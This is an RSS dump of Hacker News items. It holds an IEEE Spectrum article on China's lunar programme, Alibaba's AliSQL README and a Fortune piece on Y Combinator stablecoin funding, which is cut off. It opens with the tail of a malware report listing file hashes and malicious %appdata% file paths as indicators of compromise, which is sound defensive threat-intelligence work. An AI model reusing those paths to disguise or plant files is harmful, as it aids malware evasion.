<a href="https://opentip.kaspersky.com/7e0790226ea461bcc9ecd4be3c315ace41e1c122/results?icid=gl_sl_post-opentip_sm-team_296c6f8b3425ef3d&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">7e0790226ea461bcc9ecd4be3c315ace41e1c122</a><br>
<a href="https://opentip.kaspersky.com/f7910d943a013eede24ac89d6388c1b98f8b3717/results?icid=gl_sl_post-opentip_sm-team_d887d29e165f69e8&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">f7910d943a013eede24ac89d6388c1b98f8b3717</a><br>
73d9d0139eaf89b7df34ceeb60e5f8c7cd2463bf<br>
<a href="https://opentip.kaspersky.com/bd4915b3597942d88f319740a9b803cc51585c4a/results?icid=gl_sl_post-opentip_sm-team_f2d4cf981d72f7a7&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">bd4915b3597942d88f319740a9b803cc51585c4a</a><br>
<a href="https://opentip.kaspersky.com/c68d09dd50e357fd3de17a70b7724f8949441d77/results?icid=gl_sl_post-opentip_sm-team_cc1d1d4ce7e25394&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">c68d09dd50e357fd3de17a70b7724f8949441d77</a><br>
<a href="https://opentip.kaspersky.com/813ace987a61af909c053607635489ee984534f4/results?icid=gl_sl_post-opentip_sm-team_e9551e01fbf6d9c9&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">813ace987a61af909c053607635489ee984534f4</a><br>
<a href="https://opentip.kaspersky.com/9fbf2195dee991b1e5a727fd51391dcc2d7a4b16/results?icid=gl_sl_post-opentip_sm-team_e8eb540eaf7ac801&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">9fbf2195dee991b1e5a727fd51391dcc2d7a4b16</a><br>
<a href="https://opentip.kaspersky.com/07d2a01e1dc94d59d5ca3bdf0c7848553ae91a51/results?icid=gl_sl_post-opentip_sm-team_cb0d7f4d17858453&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">07d2a01e1dc94d59d5ca3bdf0c7848553ae91a51</a><br>
<a href="https://opentip.kaspersky.com/3090ecf034337857f786084fb14e63354e271c5d/results?icid=gl_sl_post-opentip_sm-team_0525022e0722b416&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">3090ecf034337857f786084fb14e63354e271c5d</a><br>
<a href="https://opentip.kaspersky.com/d0662eadbe5ba92acbd3485d8187112543bcfbf5/results?icid=gl_sl_post-opentip_sm-team_1f09cef9aa5e7a47&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">d0662eadbe5ba92acbd3485d8187112543bcfbf5</a><br>
<a href="https://opentip.kaspersky.com/9c0eff4deeb626730ad6a05c85eb138df48372ce/results?icid=gl_sl_post-opentip_sm-team_fc30c07aecbf5645&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">9c0eff4deeb626730ad6a05c85eb138df48372ce</a></p>
<p>Malicious file paths<br>
%appdata%\ProShow\load<br>
%appdata%\Adobe\Scripts\alien.ini<br>
%appdata%\Bluetooth\BluetoothService</p>
												</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[FlashAttention-T: Towards Tensorized Attention (110 pts)]]></title>
            <link>https://dl.acm.org/doi/10.1145/3774934.3786425</link>
            <guid>46877403</guid>
            <pubDate>Tue, 03 Feb 2026 21:15:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dl.acm.org/doi/10.1145/3774934.3786425">https://dl.acm.org/doi/10.1145/3774934.3786425</a>, See on <a href="https://news.ycombinator.com/item?id=46877403">Hacker News</a></p>
Couldn't get https://dl.acm.org/doi/10.1145/3774934.3786425: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Data centers in space makes no sense (941 pts)]]></title>
            <link>https://civai.org/blog/space-data-centers</link>
            <guid>46876105</guid>
            <pubDate>Tue, 03 Feb 2026 19:37:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://civai.org/blog/space-data-centers">https://civai.org/blog/space-data-centers</a>, See on <a href="https://news.ycombinator.com/item?id=46876105">Hacker News</a></p>
Couldn't get https://civai.org/blog/space-data-centers: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[China Moon Mission: Aiming for 2030 lunar landing (142 pts)]]></title>
            <link>https://spectrum.ieee.org/china-moon-mission-mengzhou-artemis</link>
            <guid>46876047</guid>
            <pubDate>Tue, 03 Feb 2026 19:32:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://spectrum.ieee.org/china-moon-mission-mengzhou-artemis">https://spectrum.ieee.org/china-moon-mission-mengzhou-artemis</a>, See on <a href="https://news.ycombinator.com/item?id=46876047">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-headline="NASA’s Rivalry/Not-Rivalry With China’s Space Agency Takes Off"><p>Slow and steady wins the race, or so goes the <a href="https://read.gov/aesop/025.html" rel="noopener noreferrer" target="_blank">fable</a>. The <a href="https://en.cmse.gov.cn/" rel="noopener noreferrer" target="_blank">China Manned Space Agency</a>, or CMSA, has repeatedly denied any rivalry with the <a href="https://spectrum.ieee.org/tag/united-states">United States</a> akin to the race to the <a href="https://spectrum.ieee.org/tag/moon">moon</a> in the 1960s. But step-by-step, one element at a time over a period of decades, it has built a <a href="https://spectrum.ieee.org/china-moon-mission-artemis" target="_self">human space program</a> with goals that include landing <a href="https://spectrum.ieee.org/china-aims-for-a-permanent-moon-base-in-the-2030s" target="_self">astronauts on the moon</a> by <a href="https://global.chinadaily.com.cn/a/202503/03/WS67c55e07a310c240449d8414.html#:~:text=The%20United%20States%20successfully%20made,at%20this%20year's%20two%20sessions?" rel="noopener noreferrer" target="_blank">2030</a> and starting a base there in the following years. And—partly because launch dates for NASA’s <a href="https://spectrum.ieee.org/tag/artemis">Artemis</a> III moon landing keep slipping toward that same time frame—U.S. space leaders are ratcheting up the <a href="https://spectrum.ieee.org/tag/space-race">space race</a> rhetoric.</p><p>“We are in a great competition with a rival that has the will and means to challenge American exceptionalism across multiple domains, including in the high ground of space,” said <a href="https://www.nasa.gov/people/jared-isaacman/" rel="noopener noreferrer" target="_blank">Jared Isaacman</a>, the new head of <a href="https://spectrum.ieee.org/tag/nasa">NASA</a>, in December. “This is not the time for delay, but for action, because if we fall behind—if we make a mistake—we may never catch up, and the consequences could shift the balance of power here on Earth.”</p><p>NASA’s <a href="https://spectrum.ieee.org/artemis-ii-launch-nasa-orion" target="_self">Artemis II</a> is almost ready to take its crew on a circumlunar test flight, and the <a href="https://spectrum.ieee.org/tag/white-house">White House</a> has said that U.S. <a href="https://spectrum.ieee.org/tag/astronauts">astronauts</a> should prioritize <a href="https://www.whitehouse.gov/presidential-actions/2025/12/ensuring-american-space-superiority/" rel="noopener noreferrer" target="_blank">a lunar landing by 2028</a>—but could <a href="https://spectrum.ieee.org/tag/china">China</a> slip in ahead? How would a Chinese moon flight work? Does the Chinese space program have technology that matches or beats the United States? </p><p>RELATED: <a href="https://spectrum.ieee.org/artemis-ii-launch-nasa-orion" target="_blank">Inside the Spacecraft That Will Carry Humans Around the Moon</a></p><p>“Nobody [in China] would argue that we are in a space race,” says <a href="https://www.linkedin.com/in/namratagoswami/" rel="noopener noreferrer" target="_blank">Namrata Goswami</a>, a professor at <a href="https://sais.jhu.edu/admissions/masters-program-admissions/how-apply/us-military-and-veteran-applicants/us-space-force-schriever-west-space-scholars-program-ile-sle" rel="noopener noreferrer" target="_blank">Johns Hopkins University</a> who has <a href="https://www.jstor.org/stable/26333878?searchText=au%3A%22Namrata+Goswami%22&amp;searchUri=%2Faction%2FdoBasicSearch%3FQuery%3Dau%253A%2522Namrata%2BGoswami%2522%26so%3Drel&amp;ab_segments=0%2Fbasic_phrase_search%2Fcontrol&amp;refreqid=fastly-default%3A8879f2e0aa2cce8be1737996d10650df&amp;seq=3" rel="noopener noreferrer" target="_blank">written</a> <a href="https://www.google.com/books/edition/Scramble_for_the_Skies/3XsGEAAAQBAJ?hl=en&amp;gbpv=1" rel="noopener noreferrer" target="_blank">extensively</a> about China’s space effort, “but they might be engaged in activity that showcases China as a space power, and they are very serious about getting somewhere first.”</p><h2>What Are the Mengzhou and Lanyue Spacecraft?</h2><p>China’s <a href="https://www.cmse.gov.cn/xwzx/yzjz/202003/t20200331_45264.html" rel="noopener noreferrer" target="_blank">lunar hardware</a> builds on existing engineering. It is based on a multipurpose crew ship called <a href="https://news.cgtn.com/news/2025-11-01/China-s-2026-space-mission-lineup-Mengzhou-1-Long-March-10A-to-debut-1HWYMJGSIkE/p.html" rel="noopener noreferrer" target="_blank">Mengzhou</a>, with capacity for <a href="https://www.space-agencies.com/2025/10/08/mengzhou-chinas-next-crewed-lunar-spacecraft/" rel="noopener noreferrer" target="_blank">six or seven astronauts</a>, though as few as three may actually fly on a trip from Earth to low lunar orbit. (China watchers dispense with the word “taikonaut” for its crew members, by the way; <a href="https://science.thewire.in/the-sciences/infinite-in-all-directions-a-science-workshop-and-why-vyomanaut-is-not-cool/" rel="noopener noreferrer" target="_blank">the word was coined in 1998</a> and has not been used by the Chinese government itself. China generally uses the word <a href="https://www.oxfordreference.com/display/10.1093/oi/authority.20110803101916587" rel="noopener noreferrer" target="_blank"><em><em>yuhangyuan</em></em></a>, roughly translated as “traveler of the universe.”)</p><p>Mengzhou, according to what the CMSA has shown, includes a crew section in the shape of a truncated cone or <a href="https://mathworld.wolfram.com/Frustum.html" rel="noopener noreferrer" target="_blank">frustum</a>, with a <a href="https://www.universetoday.com/articles/china-names-its-capsule-and-lander-for-its-upcoming-human-lunar-missions#:~:text=According%20to%20Chinese%20state%20media%2C%20the%20Mengzhou%20spacecraft&amp;text=In%20addition%20to%20this%2C%20there%20will%20be,module%20that%20is%20home%20to%20power%20and" rel="noopener noreferrer" target="_blank">service module</a> holding power and propulsion systems in the rear. If you squint at it, you’ll see a resemblance to the American <a href="https://images.nasa.gov/details/art001e000415" rel="noopener noreferrer" target="_blank">Artemis</a> or <a href="https://images.nasa.gov/details/as15-88-11974" rel="noopener noreferrer" target="_blank">Apollo</a> spacecraft, the <a href="https://spectrum.ieee.org/tag/spacex">SpaceX</a> <a href="https://images.nasa.gov/details/KSC-20180520-PH_SPX01_0001" rel="noopener noreferrer" target="_blank">Crew Dragon</a>, or the yet-to-be-flown European <a href="https://spectrum.ieee.org/spacex-competitors" target="_self">Nyx</a>. Basic <a href="https://spectrum.ieee.org/tag/aerodynamics">aerodynamics</a> make a blunt cone a very efficient shape for safely launching a spacecraft and returning it through Earth’s atmosphere.</p><p> <img alt="A crewed spacecraft with deployed parachutes gently descends back to Earth." data-rm-shortcode-id="ef24a46bc3a70dd031b26d5a963d0b72" data-rm-shortcode-name="rebelmouse-image" data-runner-src="https://spectrum.ieee.org/media-library/a-crewed-spacecraft-with-deployed-parachutes-gently-descends-back-to-earth.jpg?id=63413486&amp;width=980" height="1500" id="a72d9" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/a-crewed-spacecraft-with-deployed-parachutes-gently-descends-back-to-earth.jpg?id=63413486&amp;width=980" width="2000"> <small placeholder="Add Photo Caption...">The Mengzhou command ship uses parachutes and airbags during a 2025 landing test in northwest China.</small><small placeholder="Add Photo Credit...">Wang Heng/Xinhua/Getty Images</small></p><p>Mengzhou is billed as reusable, with an outer heat shield that can be replaced after flight. Landings would take place in China’s western desert. “Coupled with the landing method of airbag cushioning,” says the CMSA in a <a href="https://www.cmse.gov.cn/xwzx/yzjz/202003/t20200331_45264.html" target="_blank">translated statement</a>, “the spacecraft itself can be better protected from damage and allow the reuse of the spacecraft.”</p><p>The ship would be launched by a new heavy-lift <a href="https://english.www.gov.cn/news/202508/15/content_WS689eec3dc6d0868f4e8f4dcb.html" target="_blank">Long March 10 booster</a>, one of two used for a given moon mission. The Long March 10, as configured for lunar flight, would stand 92.5 meters high at launch and generate thrust of 2,678 tonnes. (The <a href="https://www.nasa.gov/reference/space-launch-system/" target="_blank">rocket for Artemis II</a> is more powerful: 3,992 tonnes.)</p><p>Mengzhou would leave for the moon after another Long March 10 has launched a <a href="https://spectrum.ieee.org/tag/lunar-landing">lunar landing</a> craft called <a href="https://www.chinadaily.com.cn/a/202402/24/WS65d9506aa31082fc043b8df2.html" target="_blank">Lanyue</a>. The two would rendezvous and dock in lunar orbit. Two astronauts would transfer to Lanyue and land on the moon’s surface; Mengzhou would wait for them in orbit for the trip home. Lanyue has a stated mass of 26 tonnes and could carry a 200-kilogram rover.</p><p>Chinese authorities <a href="https://www.rand.org/pubs/commentary/2025/11/china-is-going-to-the-moon-by-2030-heres-whats-known.html#:~:text=Officials%20envisage%20two%20versions%20initially,the%20lunar%20surface%20in%202030." rel="noopener noreferrer" target="_blank">say</a> testing of Lanyue began in 2024. Mengzhou should go on its first robotic flight in 2026; Lanyue, in 2027. The first joint test mission is planned for 2028 or 2029, with the first crew going to the moon a year after that.</p><h2>What Is China’s Long-Term Plan for Space?</h2><p>But to focus on their hardware is to miss out on a major difference between the Chinese and U.S. moon-landing efforts. Artemis is the product of a start-again stop-again debate that’s been going on in the U.S. government since <a href="https://spectrum.ieee.org/tag/apollo">Apollo</a> ended in the 1970s. Goals have shifted repeatedly—often when new presidents took office. Conversely, the <a href="https://spectrum.ieee.org/taikonauts-prepare-for-liftoff" target="_self">Chinese campaign</a> is the outgrowth of a plan called <a href="https://english.cas.cn/newsroom/archive/china_archive/cn2003/200909/t20090923_40427.shtml" rel="noopener noreferrer" target="_blank">Project 921</a>, first backed by the Chinese Communist Party in 1992. There have been updates and some technical setbacks, but China has pretty much stuck to it ever since.</p><p>“What the Chinese space effort has done that others have not is integrate everything,” says Goswami. “It’s not just ‘We’re going to mount a mission.’ It’s bigger than that. They view space as an activity and not missions.”</p><p>In other words, she says, each new piece of technology is part of a coordinated effort to create a <a href="https://spectrum.ieee.org/could-china-get-to-mars-first" target="_self">sustained presence in space</a>, which pays <a href="https://thediplomat.com/2021/05/china-moves-toward-a-permanent-space-presence/" rel="noopener noreferrer" target="_blank">economic, geopolitical, and sometimes military dividends</a>. Each part, so far, has fit together with other parts: The first orbiting capsule, called <a href="https://spectrum.ieee.org/tag/shenzhou">Shenzhou</a> 1 in 1999, led to the first flight by an astronaut, <a href="https://news.cgtn.com/news/2025-04-25/Yang-Liwei-China-s-first-man-in-space-1CRp6L9OiR2/p.html" rel="noopener noreferrer" target="_blank">Yang Lewei</a>, on Shenzhou 5 in 2003. That led to <a href="https://spectrum.ieee.org/tag/space-stations">space stations</a> (the Tiangong series, starting in 2011), to which Shenzhou crews have been flying since in regular rotation (<a href="https://english.news.cn/20251125/33b434deeca34129a221eb1d158ac9b8/c.html" rel="noopener noreferrer" target="_blank">Shenzhou 22</a> launched in November). Mengzhou will eventually take over as the workhorse crew vehicle for Earth-orbiting flights.</p><p>In the meantime, there has been a steady cadence of robotic lunar orbiters and landers (<a href="https://www.cnsa.gov.cn/english/n6465652/n6465653/c10573102/content.html" rel="noopener noreferrer" target="_blank">Chang’e-6</a> returned the first-ever soil sample from the moon’s far side in 2024), soon to be followed, we’re now told, by Chinese astronauts.</p><p>They started slowly, deliberately, with long breaks between missions, only recently picking up speed. At times they have unabashedly looked to other countries for guidance: The Shenzhou crew capsule in the 1990s <a href="https://spectrum.ieee.org/taikonauts-prepare-for-liftoff" target="_self">borrowed heavily from the design of the Russian Soyuz</a>. And several engineers today point out that the Mengzhou-Lanyue plan sounds in many ways like what then-administrator Michael Griffin proposed for <a href="https://www.academia.edu/36857670/NASA_Constellation_Missions_Program_Full_" rel="noopener noreferrer" target="_blank">NASA’s Constellation program</a> back in 2005—a crewed ship launched by one rocket, a moon lander by another, with astronauts transferring to the lander once they reach lunar orbit. A crew capsule and <a href="https://spectrum.ieee.org/tag/lunar-lander">lunar lander</a> would be too much for one launch, as with the Apollo–Saturn V, because landings would be more ambitious than could be achieved with Apollo’s minimalist lunar module, with longer stays and equipment for a <a href="https://spectrum.ieee.org/tag/lunar-base">lunar base</a>.</p><p>“The Chinese are pursuing an architecture a lot like the Apollo architecture was. Which is understandable because their ambitions are to go fast, and Apollo worked,” says a former senior NASA manager who, like several others, asked not to be quoted by name.</p><p>“I have a lot of friends who have been watching the Chinese space program for the last couple of decades,” this person continued. “And the one hallmark that we can say is that when China announces dates for things, they typically maintain them.”</p><h2>“Our Great Rival”</h2><p>And that is why Jared Isaacman talks of urgency at NASA. He has so far generally avoided the word “China” in public. The Chinese, in his words, are usually “our great rival” or “a competitor.” Some NASA <a href="https://spectrum.ieee.org/tag/veterans">veterans</a> say China may turn out to be giving the agency a helpful push to be faster and more agile. They say Apollo succeeded, in large part, because of the race to beat the <a href="https://spectrum.ieee.org/tag/soviet-union">Soviet Union</a>. A Chinese challenge—even unstated, even illusory—may help Artemis move along.</p><p>“We have a great competitor that is moving at absolutely impressive speeds,” Isaacman <a href="https://www.youtube.com/watch?v=WdQiPJ6KmRc" rel="noopener noreferrer" target="_blank">told</a> NASA employees, “and it’s unsettling to consider the implications if we fail to maintain our technological, scientific, or economic edge in space. And the clock is running.” </p><p><span><em>This is part 2 of a three-part series, Back to the Moon</em></span><em><em>. <a href="https://spectrum.ieee.org/artemis-ii-launch-nasa-orion" target="_blank">Part 1</a> is about the technology behind NASA’s Artemis II mission. Part 3 will look at how NASA reinvigorated its <a href="https://spectrum.ieee.org/tag/human-spaceflight">human spaceflight</a> program.</em></em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AliSQL: Alibaba's open-source MySQL with vector and DuckDB engines (272 pts)]]></title>
            <link>https://github.com/alibaba/AliSQL</link>
            <guid>46875228</guid>
            <pubDate>Tue, 03 Feb 2026 18:40:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/alibaba/AliSQL">https://github.com/alibaba/AliSQL</a>, See on <a href="https://news.ycombinator.com/item?id=46875228">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">AliSQL</h2><a id="user-content-alisql" aria-label="Permalink: AliSQL" href="#alisql"></a></p>
<p dir="auto">AliSQL is Alibaba's MySQL branch, forked from official MySQL and used extensively in Alibaba Group's production environment. It includes various performance optimizations, stability improvements, and features tailored for large-scale applications.</p>
<ul dir="auto">
<li><a href="#alisql">AliSQL</a>
<ul dir="auto">
<li><a href="#-quick-start-duckdb">🚀 Quick Start (DuckDB)</a></li>
<li><a href="#version-information">Version Information</a></li>
<li><a href="#features">Features</a></li>
<li><a href="#roadmap">Roadmap</a></li>
<li><a href="#getting-started">Getting Started</a></li>
<li><a href="#support">Support</a></li>
<li><a href="#contributing">Contributing</a></li>
<li><a href="#license">License</a></li>
<li><a href="#see-also">See Also</a></li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🚀 Quick Start (DuckDB)</h2><a id="user-content--quick-start-duckdb" aria-label="Permalink: 🚀 Quick Start (DuckDB)" href="#-quick-start-duckdb"></a></p>
<blockquote>
<p dir="auto"><strong>Quickly build your DuckDB node:</strong> <strong><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/duckdb/how-to-setup-duckdb-node-en.md">How to set up a DuckDB node</a></strong></p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">Version Information</h2><a id="user-content-version-information" aria-label="Permalink: Version Information" href="#version-information"></a></p>
<ul dir="auto">
<li><strong>AliSQL Version</strong>: 8.0.44 (LTS)</li>
<li><strong>Based on</strong>: MySQL 8.0.44</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/duckdb/duckdb-en.md">DuckDB Storage Engine</a></strong>:AliSQL integrates DuckDB as a native storage engine, allowing users to operate DuckDB with the same experience as MySQL. By leveraging AliSQL for rapid deployment of DuckDB service nodes, users can easily achieve lightweight analytical capabilities.</p>
</li>
<li>
<p dir="auto"><strong><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/vidx/vidx_readme.md">Vector Storage</a></strong>:AliSQL natively supports enterprise-grade vector processing for up to 16,383 dimensions. By integrating a highly optimized HNSW algorithm for high-performance Approximate Nearest Neighbor (ANN) search, AliSQL empowers users to build AI-driven applications—such as semantic search and recommendation systems—seamlessly using standard SQL interfaces.</p>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Roadmap</h2><a id="user-content-roadmap" aria-label="Permalink: Roadmap" href="#roadmap"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong><a href="https://www.alibabacloud.com/help/en/rds/apsaradb-rds-for-mysql/alisql-ddl-best-practices?spm=a2c63.p38356.help-menu-26090.d_2_8_0.1f7a28a5F1ZVeK" rel="nofollow">DDL Optimization</a></strong> <em>(planned)</em>:AliSQL delivers a faster, safer, and lighter DDL experience through innovations such as enhanced Instant DDL, parallel B+tree construction, a non-blocking lock mechanism, and real-time DDL apply—significantly improving schema change efficiency and virtually eliminating replication lag.</p>
</li>
<li>
<p dir="auto"><strong><a href="https://www.alibabacloud.com/help/en/rds/apsaradb-rds-for-mysql/best-practices-for-rto-optimization-in-alisql?spm=a3c0i.36496430.J_TlTAa0s_LXHOq4tuiO-gv.1.43c56e9bd5YdDQ&amp;scm=20140722.S_help@@%E6%96%87%E6%A1%A3@@2880006._.ID_help@@%E6%96%87%E6%A1%A3@@2880006-RL_RDSMySQLRTO-LOC_2024SPAllResult-OR_ser-PAR1_0bc3b4af17685488697221621e29f2-V_4-PAR3_r-RE_new5-P0_0-P1_0" rel="nofollow">RTO Optimization</a></strong> <em>(planned)</em>:AliSQL deeply optimizes the end-to-end crash recovery path to accelerate instance startup, shorten RTO, and restore service quickly.</p>
</li>
<li>
<p dir="auto"><strong><a href="https://www.alibabacloud.com/help/en/rds/apsaradb-rds-for-mysql/replication-optimization/?spm=a2c63.p38356.help-menu-26090.d_2_6.48a125033Ze9gw" rel="nofollow">Replication Optimization</a></strong> <em>(planned)</em>: AliSQL significantly boosts replication throughput and minimizes lag by implementing Binlog Parallel Flush, Binlog in Redo, and specialized optimizations for large transactions and DDL operations.</p>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Getting Started</h2><a id="user-content-getting-started" aria-label="Permalink: Getting Started" href="#getting-started"></a></p>
<p dir="auto"><strong>Prerequisites</strong>:</p>
<ul dir="auto">
<li><a href="https://cmake.org/" rel="nofollow">CMake</a> 3.x or higher</li>
<li>Python3</li>
<li>C++17 compliant compiler (GCC 7+ or Clang 5+)</li>
</ul>
<p dir="auto"><strong>Build Instructions</strong>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Clone the repository
git clone https://github.com/alibaba/AliSQL.git
cd AliSQL

# Build the project (release build)
sh build.sh -t release -d /path/to/install/dir

# For development/debugging (debug build)
sh build.sh -t debug -d /path/to/install/dir

# Install the built MySQL server
make install"><pre><span><span>#</span> Clone the repository</span>
git clone https://github.com/alibaba/AliSQL.git
<span>cd</span> AliSQL

<span><span>#</span> Build the project (release build)</span>
sh build.sh -t release -d /path/to/install/dir

<span><span>#</span> For development/debugging (debug build)</span>
sh build.sh -t debug -d /path/to/install/dir

<span><span>#</span> Install the built MySQL server</span>
make install</pre></div>
<p dir="auto"><strong>Build Options</strong>:</p>
<ul dir="auto">
<li><code>-t release|debug</code>: Build type (default: debug)</li>
<li><code>-d &lt;dest_dir&gt;</code>: Installation directory (default: /usr/local/alisql or $HOME/alisql)</li>
<li><code>-s &lt;server_suffix&gt;</code>: Server suffix (default: alisql-dev)</li>
<li><code>-g asan|tsan</code>: Enable sanitizer</li>
<li><code>-c</code>: Enable GCC coverage (gcov)</li>
<li><code>-h, --help</code>: Show help</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Support</h2><a id="user-content-support" aria-label="Permalink: Support" href="#support"></a></p>
<ul dir="auto">
<li><strong>GitHub Issues</strong>: <a href="https://github.com/alibaba/AliSQL/issues">https://github.com/alibaba/AliSQL/issues</a></li>
<li><strong>Alibaba Cloud RDS</strong>: <a href="https://help.aliyun.com/zh/rds/apsaradb-rds-for-mysql/duckdb-based-analytical-instance/" rel="nofollow">DuckDB-based Analytical Instance</a></li>
</ul>
<blockquote>
<p dir="auto">For DuckDB-specific support, see the <a href="https://duckdblabs.com/support/" rel="nofollow">DuckDB Support Options</a>.</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">AliSQL 8.0 became an open-source project in December 2025 and is actively maintained by engineers at Alibaba Group.</p>
<p dir="auto">Contributions are welcome! Please:</p>
<ol dir="auto">
<li>Fork the repository</li>
<li>Create a feature branch</li>
<li>Make your changes with appropriate tests</li>
<li>Submit a pull request</li>
</ol>
<p dir="auto">For bug reports and feature requests, please use the <a href="https://github.com/alibaba/AliSQL/issues">GitHub Issues</a> page.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">This project is licensed under the GPL-2.0 license. See the <a href="https://github.com/alibaba/AliSQL/blob/master/LICENSE">LICENSE</a> file for details.</p>
<p dir="auto">AliSQL is based on MySQL, which is licensed under GPL-2.0. The DuckDB integration follows the same licensing terms.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">See Also</h2><a id="user-content-see-also" aria-label="Permalink: See Also" href="#see-also"></a></p>
<ul dir="auto">
<li><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/changes-in-alisql-8.0.44.md">AliSQL Release Notes</a></li>
<li><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/duckdb/duckdb-en.md">DuckDB Storage Engine in AliSQL</a></li>
<li><a href="https://github.com/alibaba/AliSQL/blob/master/wiki/vidx/vidx_readme.md">Vector Index in AliSQL</a></li>
<li><a href="https://dev.mysql.com/doc/refman/8.0/en/" rel="nofollow">MySQL 8.0 Documentation</a></li>
<li><a href="https://github.com/mysql/mysql-server">MySQL 8.0 Github Repository</a></li>
<li><a href="https://duckdb.org/docs/stable/" rel="nofollow">DuckDB Official Documentation</a></li>
<li><a href="https://github.com/duckdb/duckdb">DuckDB GitHub Repository</a></li>
<li><a href="https://mp.weixin.qq.com/s/_YmlV3vPc9CksumXvXWBEw" rel="nofollow">Detailed Article (Chinese)</a></li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Y Combinator will let founders receive funds in stablecoins (146 pts)]]></title>
            <link>https://fortune.com/2026/02/03/famed-startup-incubator-y-combinator-to-let-founders-receive-funds-in-stablecoins/</link>
            <guid>46875033</guid>
            <pubDate>Tue, 03 Feb 2026 18:28:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://fortune.com/2026/02/03/famed-startup-incubator-y-combinator-to-let-founders-receive-funds-in-stablecoins/">https://fortune.com/2026/02/03/famed-startup-incubator-y-combinator-to-let-founders-receive-funds-in-stablecoins/</a>, See on <a href="https://news.ycombinator.com/item?id=46875033">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article data-cy="article-content"><p>In the latest sign of digital currencies going mainstream, Silicon Valley’s most prominent startup incubator will allow its spring cohort of entrepreneurs to receive their funding in stablecoins. Y Combinator, whose alumni include the founders of <a aria-label="Go to https://fortune.com/company/airbnb/" target="_blank" href="https://fortune.com/company/airbnb/">Airbnb</a> and <a aria-label="Go to https://fortune.com/company/doordash/" target="_blank" href="https://fortune.com/company/doordash/">DoorDash</a>, announced on Tuesday that founders can opt to receive their customary allotment—typically around $500,000—in the Circle-issued USDC.&nbsp;</p><div>



<p>Startup founders who choose stablecoins can choose to receive the tokens on various blockchains such as Ethereum and Solana, Nemil Dalal, a visiting partner at Y Combinator who focuses on crypto, told <em>Fortune</em>. He added that Y Combinator may expand to other stablecoins depending on demand.</p>



<p>“Stablecoins is one of the key pillars for us,” Dalal said, referring to one of the areas where Y Combinator would like to see more startup ideas. “So we just want to live and breathe that as well.”</p>



<h2>Price agnostic</h2>



<p>While many crypto venture capitalists have let the startups in their portfolio take funding from stablecoins for some time, more traditional tech investors haven’t given that opportunity to founders. Dalal, for example, said he wasn’t aware of any legacy VCs who offer that option. “We’re excited for a world where, in the future, we think a lot of startups will eventually start raising capital on-chain,” he said.&nbsp;</p>



<p>Stablecoins have been around for more than a decade, but historically, their adoption was primarily limited to crypto traders seeking a non-volatile asset in which to park profits. In the past two years, however, stablecoins have burst into the <a aria-label="Go to https://fortune.com/2026/01/17/stablecoins-could-fix-a-broken-international-payments-system/" href="https://fortune.com/2026/01/17/stablecoins-could-fix-a-broken-international-payments-system/">headlines</a> following a push by Wall Street and corporations that view the assets as a faster and more inexpensive way to move money around.</p>



